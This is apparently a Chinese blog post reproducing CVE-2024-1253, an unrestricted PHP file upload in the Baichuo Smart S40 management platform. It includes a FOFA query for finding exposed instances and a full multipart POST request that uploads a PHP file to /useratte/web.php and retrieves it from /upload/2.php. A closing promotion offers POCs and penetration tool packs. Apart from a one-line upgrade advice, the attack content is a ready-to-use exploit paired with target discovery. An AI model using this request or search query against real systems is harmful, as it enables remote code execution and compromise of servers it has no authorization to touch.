#  CVE-2024-1253   
原创 fgz  AI与网安   2024-02-09 06:00  
  
免  
责  
申  
明  
：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**  
  
  
  
01  
  
—  
  
漏洞名称  
  
  
  
北京百绰智能S40管理平台导入web.php无限制上传  
漏洞  
  
  
  
02  
  
—  
  
漏洞影响  
  
  
北京百绰智能S40管理平台20240126版本。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPZg8Tx7kjFeAzx1xlFqGFsOGFkWMXj8QgsNlxXwR1z6L019IvGicic5nEGlPuQQBu8beUibq3hdlCnw/640?wx_fmt=png&from=appmsg "")  
  
  
  
03  
  
—  
  
漏洞描述  
  
  
北京百绰智能S40管理平台20240126版本存在一种关键漏洞。该漏洞影响了组件Import Handler的/useratte/web.php文件的某些未知功能。通过对参数file_upload的操纵可导致未受限的上传。攻击可能会远程启动。该漏洞的利用已经公开并可能被利用。  
  
  
漏洞成因分析：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPZg8Tx7kjFeAzx1xlFqGFsPaTT0W7lWXI1KtTVeoUmloH7f9IYbOC4BmmWQkibuABDKibibGiby2C2Rw/640?wx_fmt=png&from=appmsg "")  
  
  
  
04  
  
—  
  
FOFA搜索语句  
  
  
```
title="Smart管理平台"
```  
  
  
  
05  
  
—  
  
漏洞复现  
  
  
文件上传数据包：  
```
POST /useratte/web.php? HTTP/1.1
Host: ip:port
Cookie: PHPSESSID=cb5c0eb7b9fabee76431aaebfadae6db
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 597
Origin: https://ip:port
Referer: https://ip:port/sysmanage/licence.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="file_upload"; filename="2.php"
Content-Type: application/octet-stream

<?php phpinfo()?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="mode"

import
-----------------------------42328904123665875270630079328
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPZg8Tx7kjFeAzx1xlFqGFsZGehib1uKL2NdFBqnIKddLlamnAU7bjKWAhBD6y29cNqEafTpRYuFjA/640?wx_fmt=png&from=appmsg "")  
  
  
回显文件路径  
/upload/2.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPZg8Tx7kjFeAzx1xlFqGFsl372hGSaFmicyFcPg59Sic3sy2Enzg3RqWKOxHMibAvwQ4Kormgb42rqA/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞复现成功  
  
  
  
06  
  
—  
  
修复建议  
  
  
升级到最新版本。  
  
  
07  
  
—  
  
资料领取  
  
  
新  
关注的朋友可以在后台发送关键字苗费获取下列资料：  
  
后台发送【  
电子书】关键字获取学习资料网盘地址  
  
  
后台发送【  
POC】关键字获取POC网盘地址  
  
  
后台发送【  
工具】获取渗透工具包  
  
  
